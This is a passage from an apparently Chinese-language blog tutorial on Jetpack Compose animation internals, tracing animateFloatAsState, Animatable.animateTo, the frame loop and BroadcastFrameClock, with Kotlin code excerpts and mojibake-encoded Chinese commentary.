    <span class="hljs-comment">// æ­¥éª¤4ï¼šå¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œç›‘å¬é€šé“å¹¶æ‰§è¡ŒåŠ¨ç”»ï¼ˆåªå¯åŠ¨ä¸€æ¬¡ï¼‰</span>
    LaunchedEffect(channel) {
        <span class="hljs-keyword">for</span> (newTarget <span class="hljs-keyword">in</span> channel) {
            <span class="hljs-comment">// è·å–æœ€æ–°çš„ç›®æ ‡å€¼ï¼ˆé¿å…å»¶è¿Ÿï¼‰</span>
            <span class="hljs-keyword">val</span> latestTarget = channel.tryReceive().getOrNull() ?: newTarget
            
            <span class="hljs-comment">// å¯åŠ¨åŠ¨ç”»ï¼</span>
            launch {
                <span class="hljs-keyword">if</span> (latestTarget != animatable.targetValue) {
                    animatable.animateTo(latestTarget)
                }
            }
        }
    }
    
    <span class="hljs-comment">// æ­¥éª¤5ï¼šè¿”å›AnimationStateå¯¹è±¡</span>
    <span class="hljs-keyword">return</span> animatable.asState()
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä½¿ç”¨Channelè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨<code>LaunchedEffect(targetValue)</code>?</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ é”™è¯¯æ–¹å¼ï¼ˆä¼šå»¶è¿Ÿä¸€å¸§ï¼‰</span>
LaunchedEffect(targetValue) {
    animatable.animateTo(targetValue)  
    <span class="hljs-comment">// é—®é¢˜ï¼šå¦‚æœç›®æ ‡å€¼å¿«é€Ÿå˜åŒ–ï¼Œåç¨‹ä¼šè¢«å–æ¶ˆå¹¶é‡å¯ï¼Œå¯¼è‡´å¡é¡¿</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®æ–¹å¼ï¼ˆä½¿ç”¨ Channelï¼‰</span>
<span class="hljs-keyword">val</span> channel = remember { Channel&lt;<span class="hljs-built_in">Float</span>&gt;(Channel.CONFLATED) }
SideEffect { channel.trySend(targetValue) }
LaunchedEffect(channel) {
    <span class="hljs-keyword">for</span> (target <span class="hljs-keyword">in</span> channel) {
        <span class="hljs-keyword">val</span> latest = channel.tryReceive().getOrNull() ?: target
        launch { animatable.animateTo(latest) }
    }
}
</code></pre>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li><code>LaunchedEffect(key)</code>Â å½“ key å˜åŒ–æ—¶ä¼š<strong>å–æ¶ˆå¹¶é‡å¯</strong>åç¨‹</li>
<li>å¦‚æœç”¨æˆ·å¿«é€Ÿç‚¹å‡» 3 æ¬¡ï¼Œç›®æ ‡å€¼å˜åŒ–ï¼š<code>1f â†’ 1.2f â†’ 1f â†’ 1.2f</code></li>
<li>æ¯æ¬¡å˜åŒ–éƒ½ä¼šé‡å¯åç¨‹ï¼Œå¯¼è‡´åŠ¨ç”»å¡é¡¿</li>
<li><strong>Channel ä¸ä¼šé‡å¯åç¨‹</strong>ï¼Œåªæ˜¯å‘é€æ–°å€¼ï¼Œåç¨‹æŒç»­è¿è¡Œ</li>
</ul>
<p><strong><code>Channel.CONFLATED</code>Â æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// CONFLATED = åªä¿ç•™æœ€æ–°å€¼ï¼Œä¸¢å¼ƒæ—§å€¼</span>
<span class="hljs-keyword">val</span> channel = Channel&lt;<span class="hljs-built_in">Float</span>&gt;(Channel.CONFLATED)

<span class="hljs-comment">// å‡è®¾å‘é€å¾ˆå¿«ï¼š</span>
channel.send(<span class="hljs-number">1.0f</span>)  <span class="hljs-comment">// ç«‹å³è¢«ä¸‹ä¸€ä¸ªè¦†ç›– âŒ</span>
channel.send(<span class="hljs-number">2.0f</span>)  <span class="hljs-comment">// ç«‹å³è¢«ä¸‹ä¸€ä¸ªè¦†ç›– âŒ</span>
channel.send(<span class="hljs-number">3.0f</span>)  <span class="hljs-comment">// âœ… è¿™æ˜¯æœ€æ–°çš„ï¼Œä¿ç•™</span>

<span class="hljs-comment">// æ¥æ”¶æ—¶åªä¼šæ”¶åˆ°ï¼š3.0f</span>
</code></pre>
<p>è¿™æ ·å¯ä»¥<strong>é¿å…åŠ¨ç”»é˜Ÿåˆ—ç§¯å‹</strong>ï¼Œå§‹ç»ˆä½¿ç”¨æœ€æ–°ç›®æ ‡å€¼ã€‚</p>
<h3 data-id="heading-35">4ã€3 Animatable.animateTo()</h3>
<h4 data-id="heading-36">4ã€3ã€1 åˆ›å»ºåŠ¨ç”»è§„æ ¼</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Animatable.kt</span>
<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">animateTo</span><span class="hljs-params">(targetValue: <span class="hljs-type">T</span>, animationSpec: <span class="hljs-type">AnimationSpec</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª"ç›®æ ‡åŠ¨ç”»"å¯¹è±¡</span>
    <span class="hljs-keyword">val</span> animation = TargetBasedAnimation(
        animationSpec = animationSpec,      <span class="hljs-comment">// æ¯”å¦‚ï¼šspring() å¼¹ç°§åŠ¨ç”»</span>
        initialValue = value,                <span class="hljs-comment">// èµ·å§‹å€¼ï¼š1.0f</span>
        targetValue = targetValue,           <span class="hljs-comment">// ç›®æ ‡å€¼ï¼š1.2f</span>
        typeConverter = typeConverter        <span class="hljs-comment">// Float è½¬æ¢å™¨</span>
    )
    
    <span class="hljs-comment">// æ‰§è¡ŒåŠ¨ç”»</span>
    runAnimation(animation, ...)
}
</code></pre>
<p><strong>TargetBasedAnimation æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>å®ƒåŒ…å«äº†åŠ¨ç”»çš„æ‰€æœ‰ä¿¡æ¯ï¼šèµ·ç‚¹ã€ç»ˆç‚¹ã€åŠ¨ç”»ç±»å‹</li>
<li>å¯ä»¥æ ¹æ®æ—¶é—´æˆ³è®¡ç®—å‡ºä»»æ„æ—¶åˆ»çš„å€¼</li>
<li>ç±»ä¼¼äºä¸€ä¸ª<strong>æ•°å­¦å‡½æ•°</strong>ï¼š<code>value = f(time)</code></li>
</ul>
<h4 data-id="heading-37">4ã€3ã€2 äº’æ–¥é”ä¿æŠ¤</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Animatable.kt</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">runAnimation</span><span class="hljs-params">(animation: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;)</span></span> {
    <span class="hljs-comment">// ğŸ”’ äº’æ–¥é”ï¼šç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªåŠ¨ç”»åœ¨è¿è¡Œ</span>
    mutatorMutex.mutate {
        <span class="hljs-keyword">try</span> {
            isRunning = <span class="hljs-literal">true</span>  <span class="hljs-comment">// æ ‡è®°ä¸ºè¿è¡Œä¸­</span>
            
            <span class="hljs-comment">// çœŸæ­£çš„åŠ¨ç”»å¾ªç¯ï¼ˆä¸‹ä¸€æ­¥ï¼‰</span>
            endState.animate(animation, startTime) {
                updateState(internalState)  <span class="hljs-comment">// æ¯å¸§æ›´æ–°å†…éƒ¨çŠ¶æ€</span>
            }
            
            isRunning = <span class="hljs-literal">false</span>  <span class="hljs-comment">// æ ‡è®°ä¸ºå®Œæˆ</span>
        } <span class="hljs-keyword">catch</span> (e: CancellationException) {
            <span class="hljs-comment">// å¦‚æœæ–°åŠ¨ç”»å¼€å§‹ï¼Œæ—§åŠ¨ç”»ä¼šè¢«å–æ¶ˆ</span>
            isRunning = <span class="hljs-literal">false</span>
            <span class="hljs-keyword">throw</span> e
        }
    }
}
</code></pre>
<p><strong>äº’æ–¥é”çš„ä½œç”¨ç¤ºæ„ï¼š</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// å‡è®¾ç”¨æˆ·å¿«é€Ÿç‚¹å‡»ä¸¤æ¬¡ï¼š</span>
<span class="hljs-selector-tag">launch</span> { <span class="hljs-selector-tag">animatable</span><span class="hljs-selector-class">.animateTo</span>(<span class="hljs-number">1.2</span>f) }  <span class="hljs-comment">// åŠ¨ç”» A å¼€å§‹</span>
<span class="hljs-selector-tag">launch</span> { <span class="hljs-selector-tag">animatable</span><span class="hljs-selector-class">.animateTo</span>(<span class="hljs-number">1.0</span>f) }  <span class="hljs-comment">// åŠ¨ç”» B æƒ³å¼€å§‹</span>

<span class="hljs-comment">// æ‰§è¡Œæµç¨‹ï¼š</span>
æ—¶é—´ <span class="hljs-number">0ms</span>:  åŠ¨ç”» <span class="hljs-selector-tag">A</span> è·å¾—é”ï¼Œå¼€å§‹è¿è¡Œ (value = <span class="hljs-number">1.0</span> â†’ <span class="hljs-number">1.2</span>)
æ—¶é—´ <span class="hljs-number">50ms</span>: åŠ¨ç”» <span class="hljs-selector-tag">B</span> å°è¯•è·å¾—é”ï¼Œå‘ç°è¢«å ç”¨
æ—¶é—´ <span class="hljs-number">50ms</span>: åŠ¨ç”» <span class="hljs-selector-tag">B</span> å–æ¶ˆåŠ¨ç”» <span class="hljs-selector-tag">A</span>ï¼ˆæŠ›å‡º <span class="hljs-selector-tag">CancellationException</span>ï¼‰
æ—¶é—´ <span class="hljs-number">50ms</span>: åŠ¨ç”» <span class="hljs-selector-tag">A</span> åœ¨ <span class="hljs-selector-tag">catch</span> å—ä¸­é‡Šæ”¾é”
æ—¶é—´ <span class="hljs-number">51ms</span>: åŠ¨ç”» <span class="hljs-selector-tag">B</span> è·å¾—é”ï¼Œå¼€å§‹è¿è¡Œ (value = <span class="hljs-number">1.05</span> â†’ <span class="hljs-number">1.0</span>)

<span class="hljs-comment">// ç»“æœï¼šåŒæ—¶åªæœ‰ä¸€ä¸ªåŠ¨ç”»ï¼Œå¹³æ»‘è¿‡æ¸¡ï¼</span>
</code></pre>
<h4 data-id="heading-38">4ã€3ã€3 å¸§å¾ªç¯æ ¸å¿ƒ</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SuspendAnimation.kt </span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationState<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">animate</span><span class="hljs-params">(
    animation: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    startTimeNanos: <span class="hljs-type">Long</span> = AnimationConstants.UnspecifiedTime,
    block: <span class="hljs-type">AnimationScope</span>&lt;<span class="hljs-type">T</span>, V&gt;.()</span></span> -&gt; <span class="hljs-built_in">Unit</span> = {},
) {
    <span class="hljs-keyword">val</span> initialValue = animation.getValueFromNanos(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">val</span> initialVelocityVector = animation.getVelocityVectorFromNanos(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">var</span> lateInitScope: AnimationScope&lt;T, V&gt;? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (startTimeNanos == AnimationConstants.UnspecifiedTime) {
            <span class="hljs-keyword">val</span> durationScale = coroutineContext.durationScale
            <span class="hljs-comment">// è°ƒç”¨BroadcastFrameClockçš„withFrameNanosä¼šæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶å°†å…¶æ³¨å†Œåˆ°ç­‰å¾…åˆ—è¡¨ä¸­</span>
            animation.callWithFrameNanos {
                <span class="hljs-comment">// ç¬¬ä¸€å¸§æ¥ä¸´çš„æ—¶å€™åˆå§‹åŒ–åŠ¨ç”»ä½œç”¨åŸŸ</span>
                lateInitScope =
                    AnimationScope(
                            initialValue = initialValue,
                            typeConverter = animation.typeConverter,
                            initialVelocityVector = initialVelocityVector,
                            lastFrameTimeNanos = it,
                            targetValue = animation.targetValue,
                            startTimeNanos = it,
                            isRunning = <span class="hljs-literal">true</span>,
                            onCancel = { isRunning = <span class="hljs-literal">false</span> },
                        )
                        .apply {
                            <span class="hljs-comment">// First frame</span>
                            doAnimationFrameWithScale(
                                it,
                                durationScale,
                                animation,
                                <span class="hljs-keyword">this</span><span class="hljs-symbol">@animate</span>,
                                block,
                            )
                        }
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ç¬¬ä¸€å¸§æ¥ä¸´çš„æ—¶å€™åˆå§‹åŒ–åŠ¨ç”»ä½œç”¨åŸŸ</span>
            lateInitScope =
                AnimationScope(
                        initialValue = initialValue,
                        typeConverter = animation.typeConverter,
                        initialVelocityVector = initialVelocityVector,
                        lastFrameTimeNanos = startTimeNanos,
                        targetValue = animation.targetValue,
                        startTimeNanos = startTimeNanos,
                        isRunning = <span class="hljs-literal">true</span>,
                        onCancel = { isRunning = <span class="hljs-literal">false</span> },
                    )
                    .apply {
                        <span class="hljs-comment">// First frame</span>
                        doAnimationFrameWithScale(
                            startTimeNanos,
                            coroutineContext.durationScale,
                            animation,
                            <span class="hljs-keyword">this</span><span class="hljs-symbol">@animate</span>,
                            block,
                        )
                    }
        }
        <span class="hljs-comment">// Subsequent frames</span>
        <span class="hljs-keyword">while</span> (lateInitScope!!.isRunning) {
            <span class="hljs-keyword">val</span> durationScale = coroutineContext.durationScale
            animation.callWithFrameNanos {
                lateInitScope!!.doAnimationFrameWithScale(it, durationScale, animation, <span class="hljs-keyword">this</span>, block)
            }
        }
        <span class="hljs-comment">// End of animation</span>
    } <span class="hljs-keyword">catch</span> (e: CancellationException) {
        lateInitScope?.isRunning = <span class="hljs-literal">false</span>
        <span class="hljs-keyword">if</span> (lateInitScope?.lastFrameTimeNanos == lastFrameTimeNanos) {
            <span class="hljs-comment">// There hasn't been another animation.</span>
            isRunning = <span class="hljs-literal">false</span>
        }
        <span class="hljs-keyword">throw</span> e
    }
}

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationScope<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">doAnimationFrameWithScale</span><span class="hljs-params">(
    frameTimeNanos: <span class="hljs-type">Long</span>,
    durationScale: <span class="hljs-type">Float</span>,
    anim: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    state: <span class="hljs-type">AnimationState</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    block: <span class="hljs-type">AnimationScope</span>&lt;<span class="hljs-type">T</span>, V&gt;.()</span></span> -&gt; <span class="hljs-built_in">Unit</span>,
) {
    <span class="hljs-keyword">val</span> playTimeNanos =
        <span class="hljs-keyword">if</span> (durationScale == <span class="hljs-number">0f</span>) {
            anim.durationNanos
        } <span class="hljs-keyword">else</span> {
            ((frameTimeNanos - startTimeNanos) / durationScale).toLong()
        }
    doAnimationFrame(frameTimeNanos, playTimeNanos, anim, state, block)
}

<span class="hljs-comment">// Impl detail, invoked every frame.</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationScope<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">doAnimationFrame</span><span class="hljs-params">(
    frameTimeNanos: <span class="hljs-type">Long</span>,
    playTimeNanos: <span class="hljs-type">Long</span>,
    anim: <span class="hljs-type">Animation</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    state: <span class="hljs-type">AnimationState</span>&lt;<span class="hljs-type">T</span>, V&gt;,
    block: <span class="hljs-type">AnimationScope</span>&lt;<span class="hljs-type">T</span>, V&gt;.()</span></span> -&gt; <span class="hljs-built_in">Unit</span>,
) {
    <span class="hljs-comment">// 1ã€ è®¡ç®—å·²ç»è¿‡äº†å¤šä¹…</span>
    lastFrameTimeNanos = frameTimeNanos
    <span class="hljs-comment">// 2ã€æ ¹æ®æ—¶é•¿è®¡ç®—å½“å‰å€¼</span>
    value = anim.getValueFromNanos(playTimeNanos)
    <span class="hljs-comment">// 3ã€è®¡ç®—å½“å‰é€Ÿåº¦</span>
    velocityVector = anim.getVelocityVectorFromNanos(playTimeNanos)
    <span class="hljs-comment">// 4ã€æ£€æŸ¥æ˜¯å¦å®Œæˆ</span>
    <span class="hljs-keyword">val</span> isLastFrame = anim.isFinishedFromNanos(playTimeNanos)
    <span class="hljs-keyword">if</span> (isLastFrame) {
        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> This could probably be a little more granular</span>
        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> end time isn't necessarily last frame time</span>
        finishedTimeNanos = lastFrameTimeNanos
        isRunning = <span class="hljs-literal">false</span>
    }
    <span class="hljs-comment">// 5ã€æ›´æ–°å†…éƒ¨çŠ¶æ€ï¼Œè¿™é‡Œä¼šè§¦å‘é‡ç»„</span>
    updateState(state)
    block()
}

<span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, V : AnimationVector&gt;</span> AnimationScope<span class="hljs-type">&lt;T, V&gt;</span>.<span class="hljs-title">updateState</span><span class="hljs-params">(
    state: <span class="hljs-type">AnimationState</span>&lt;<span class="hljs-type">T</span>, V&gt;
)</span></span> {
    <span class="hljs-comment">// æ›´æ–°AnimationStateçš„valueï¼Œè§¦å‘é‡ç»„</span>
    state.value = value
    state.velocityVector.copyFrom(velocityVector)
    state.finishedTimeNanos = finishedTimeNanos
    state.lastFrameTimeNanos = lastFrameTimeNanos
    state.isRunning = isRunning
}

</code></pre>
<p><strong>å¸§å¾ªç¯å¯è§†åŒ–ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">å¸§ 1 (0ms):   withFrameNanos æŒ‚èµ· â†’ VSync åˆ°æ¥ â†’ è®¡ç®— <span class="hljs-attr">value</span> = <span class="hljs-number">1.0</span>
              â†“ æ›´æ–° state â†’ è§¦å‘é‡ç»„ â†’ UI æ˜¾ç¤º 1.0
              
å¸§ 2 (16ms):  withFrameNanos æŒ‚èµ· â†’ VSync åˆ°æ¥ â†’ è®¡ç®— <span class="hljs-attr">value</span> = <span class="hljs-number">1.02</span>
              â†“ æ›´æ–° state â†’ è§¦å‘é‡ç»„ â†’ UI æ˜¾ç¤º 1.02
              
å¸§ 3 (32ms):  withFrameNanos æŒ‚èµ· â†’ VSync åˆ°æ¥ â†’ è®¡ç®— <span class="hljs-attr">value</span> = <span class="hljs-number">1.04</span>
              â†“ æ›´æ–° state â†’ è§¦å‘é‡ç»„ â†’ UI æ˜¾ç¤º 1.04
              
... (ç»§ç»­çº¦ 15 å¸§)

å¸§ 18 (288ms): withFrameNanos æŒ‚èµ· â†’ VSync åˆ°æ¥ â†’ è®¡ç®— <span class="hljs-attr">value</span> = <span class="hljs-number">1.2</span>
               â†“ æ›´æ–° state â†’ è§¦å‘é‡ç»„ â†’ UI æ˜¾ç¤º 1.2
               â†“ <span class="hljs-attr">isRunning</span> = <span class="hljs-literal">false</span> â†’ é€€å‡ºå¾ªç¯ â†’ åŠ¨ç”»å®Œæˆ âœ“
</code></pre>
<h3 data-id="heading-39">4ã€3ã€4 callWithFrameNanos</h3>
<p><code>callWithFrameNanos</code>ä¼šè°ƒç”¨<code>withFrameNanos</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SuspendAnimation.kt</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">callWithFrameNanos</span><span class="hljs-params">(
    onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">Unit</span>
)</span></span>: <span class="hljs-built_in">Unit</span> {
    <span class="hljs-comment">// æ ¹æ®åŠ¨ç”»ç±»å‹é€‰æ‹©å¸§æ—¶é’Ÿ</span>
    <span class="hljs-keyword">if</span> (isInfinite) {
        withInfiniteAnimationFrameNanos(onFrame)  <span class="hljs-comment">// æ— é™åŠ¨ç”»</span>
    } <span class="hljs-keyword">else</span> {
        withFrameNanos { frameTime -&gt;              <span class="hljs-comment">// æ™®é€šåŠ¨ç”»</span>
            onFrame(frameTime / AnimationDebugDurationScale)
        }
    }
}
</code></pre>
<h3 data-id="heading-40">4ã€3ã€5 withFrameNanosæ˜¯ä»€ä¹ˆ</h3>
<p><strong><code>coroutineContext</code>æ˜¯å“ªä¸ªåç¨‹çš„ä¸Šä¸‹æ–‡ï¼Ÿ</strong></p>
<p>åœ¨å“ªä¸ªåç¨‹é‡Œé¢è°ƒç”¨<code>coroutineContext</code>å°±æ˜¯å“ªä¸ªåç¨‹çš„ä¸Šä¸‹æ–‡ã€‚<code>LaunchedEffect</code>å¯åŠ¨äº†åç¨‹ï¼Œæ‰§è¡ŒåŠ¨ç”»ä»£ç ï¼Œ<code>coroutineContext</code>æ˜¯<code>LaunchedEffect</code>çš„åç¨‹ä¸Šä¸‹æ–‡ã€‚</p>
<p>åœ¨3ã€4ç« èŠ‚ä»‹ç»äº†<code>LaunchedEffect</code>ä½¿ç”¨çš„æ˜¯Composerçš„åç¨‹ä¸Šä¸‹æ–‡ï¼Œ<code>Composer</code>çš„åç¨‹ä¸Šä¸‹æ–‡æ˜¯<code>Recomposer</code>çš„åç¨‹ä¸Šä¸‹æ–‡ã€‚ä¸Šä¸‹æ–‡åŒ…å«äº†<code>AndroidUiDispatcher</code>ã€<code>BroadcastFrameClock</code>ã€<code>effectJob</code>å’Œ<code>MotionDurationScale</code>ã€‚æ‰€ä»¥<code>coroutineContext.monotonicFrameClock</code>æ‹¿åˆ°çš„æ˜¯<code>BroadcastFrameClock</code>ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
    <span class="hljs-comment">// coroutineContextæ˜¯å‰¯ä½œç”¨çš„åç¨‹ä¸Šä¸‹æ–‡</span>
    coroutineContext.monotonicFrameClock.withFrameNanos(onFrame)
    

<span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> CoroutineContext.monotonicFrameClock: MonotonicFrameClock
    <span class="hljs-keyword">get</span>() =
        <span class="hljs-keyword">this</span>[MonotonicFrameClock]
            ?: error(
                <span class="hljs-string">"A MonotonicFrameClock is not available in this CoroutineContext. Callers should supply "</span> +
                    <span class="hljs-string">"an appropriate MonotonicFrameClock using withContext."</span>
            )
    
</code></pre>
<p><code>withFrameNanos</code>ä¼šä»<code>coroutineContext</code>ä¸­è·å–<code>MonotonicFrameClock</code>ï¼Œè¿™ä¸ª <code>MonotonicFrameClock</code>å°±æ˜¯<code>Recomposer</code>çš„<code>BroadcastFrameClock</code>ã€‚</p>
<p><code>withFrameNanos</code>è°ƒç”¨<code>BroadcastFrameClock</code>çš„<code>withFrameNanos</code>ï¼Œ<code>BroadcastFrameClock</code>çš„<code>withFrameNanos</code>ä¼šæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶å°†å…¶æ³¨å†Œåˆ°ç­‰å¾…åˆ—è¡¨ä¸­ã€‚
å½“ä¸‹ä¸€å¸§æ¥ä¸´çš„æ—¶å€™ï¼Œä¼šå”¤é†’Recomposerå¸§å¾ªç¯ï¼Œè°ƒç”¨<code>BroadcastFrameClock</code>çš„<code>sendFrame</code>æ¥å”¤é†’æ‰€æœ‰ç­‰å¾…çš„åŠ¨ç”»åç¨‹ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendFrame</span><span class="hljs-params">(timeNanos: <span class="hljs-type">Long</span>)</span></span> {
        synchronized(lock) {
            <span class="hljs-comment">// 1. äº¤æ¢åˆ—è¡¨ï¼šå°†å½“å‰ç­‰å¾…åˆ—è¡¨ä¸å¤‡ç”¨åˆ—è¡¨äº¤æ¢</span>
            <span class="hljs-comment">// è¿™æ ·å¯ä»¥é¿å…åœ¨æ¢å¤åç¨‹æ—¶æ–°åç¨‹åŠ å…¥å¯¼è‡´çš„é—®é¢˜</span>
            <span class="hljs-keyword">val</span> toResume = awaiters
            awaiters = spareList
            spareList = toResume
            
            <span class="hljs-comment">// 2. é‡ç½®è®¡æ•°å™¨å¹¶å¢åŠ ç‰ˆæœ¬å·</span>
            pendingAwaitersCountUnlocked.incrementVersionAndResetCount()

            <span class="hljs-comment">// 3. æ¢å¤æ‰€æœ‰ç­‰å¾…çš„åç¨‹</span>
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until toResume.size) {
                toResume[i].resume(timeNanos)
            }
            
            <span class="hljs-comment">// 4. æ¸…ç©ºåˆ—è¡¨</span>
            toResume.clear()
        }
    }
</code></pre>
<h3 data-id="heading-41">4ã€3ã€5 ä¸ºä»€ä¹ˆ<code>internalState.value = newValue</code>Â ä¼šè§¦å‘é‡ç»„ï¼Ÿ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Animatable.kt</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">val</span> internalState = AnimationState(
    typeConverter = typeConverter,
    initialValue = initialValue
)

<span class="hljs-comment">// AnimationState.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AnimationState</span>&lt;<span class="hljs-type">T, V</span>&gt; {
    <span class="hljs-comment">// åŠ¨ç”»ä¼šä¿®æ”¹è¿™ä¸ªå€¼ï¼Œè§¦å‘é‡ç»„</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">var</span> value: T <span class="hljs-keyword">by</span> mutableStateOf(initialValue)  â† ğŸ”‘ è¿™æ˜¯å…³é”®ï¼
        <span class="hljs-keyword">internal</span> <span class="hljs-keyword">set</span>
}

<span class="hljs-comment">// è¿”å›ç»™ UI çš„ State</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">asState</span><span class="hljs-params">()</span></span>: State&lt;T&gt; = internalState  â† è¿”å›åŒ…å« mutableStateOf çš„å¯¹è±¡
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MyButton</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// animateFloatAsState è¿”å›çš„æ˜¯ AnimationState å¯¹è±¡</span>
    <span class="hljs-keyword">val</span> scaleState: State&lt;<span class="hljs-built_in">Float</span>&gt; = animateFloatAsState(...)
    
    <span class="hljs-comment">// è¯»å– scale çš„å€¼</span>
    <span class="hljs-keyword">val</span> scale <span class="hljs-keyword">by</span> scaleState  <span class="hljs-comment">// å®é™…è¯»å– AnimationState.value</span>
    
    Box(modifier = Modifier.scale(scale)) {  
        <span class="hljs-comment">// Compose åœ¨è¿™é‡Œè®°å½•ï¼š</span>
        <span class="hljs-comment">// "Box è¯»å–äº† AnimationState.value"</span>
    }
}
</code></pre>
<p><strong>è¿˜è®°å¾—åœ¨<a href="https://juejin.cn/post/7597276695403708457" target="_blank" title="https://juejin.cn/post/7597276695403708457">ComposeåŸç†å››ä¹‹é‡ç»„</a>ä¸­ä»‹ç»äº†é‡ç»„çš„åŸç†ã€‚å…·ä½“åˆ°ä¸Šé¢çš„ä¾‹å­ï¼Œ<code>animateFloatAsState</code>è¿”å›çš„æ˜¯<code>AnimationState</code>å¯¹è±¡ï¼Œ<code>Box</code>è¯»å–äº†çŠ¶æ€å˜é‡<code>AnimationState.value</code>ï¼Œ<code>MyButton</code>çš„é‡ç»„ä½œç”¨åŸŸå¯¹è±¡æ”¾åˆ°äº†mapä¸­ã€‚åŠ¨ç”»åç¨‹è°ƒç”¨<code>withFrameNanos</code>ä¼šæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶å°†å…¶æ³¨å†Œåˆ°ç­‰å¾…åˆ—è¡¨ä¸­ã€‚å½“ä¸‹ä¸€å¸§æ¥ä¸´åï¼Œä¸åœçš„ä¿®æ”¹<code>AnimationState.value</code>ï¼Œä¸åœçš„é‡æ–°æ‰§è¡Œ<code>MyButton</code>ï¼Œ<code>MyButton</code>è¯»å–æœ€æ–°çš„scaleå€¼ï¼Œä¸åœçš„è¿›è¡Œç¼©æ”¾ã€‚</strong></p>
<h3 data-id="heading-42">4ã€3ã€6 MotionDurationScaleï¼šæ§åˆ¶åŠ¨ç”»æ—¶é•¿</h3>
<p>å®‰å“éœ€è¦æ”¯æŒ"å¼€å‘è€…é€‰é¡¹"ä¸­çš„"åŠ¨ç”»æ—¶é•¿ç¼©æ”¾"è®¾ç½®ï¼Œè¿™æ˜¯é€šè¿‡ <code>MotionDurationScale</code> æ¥å£å®ç°çš„ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// MotionDurationScale.kt</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MotionDurationScale</span> : <span class="hljs-type">CoroutineContext.Element</span> {
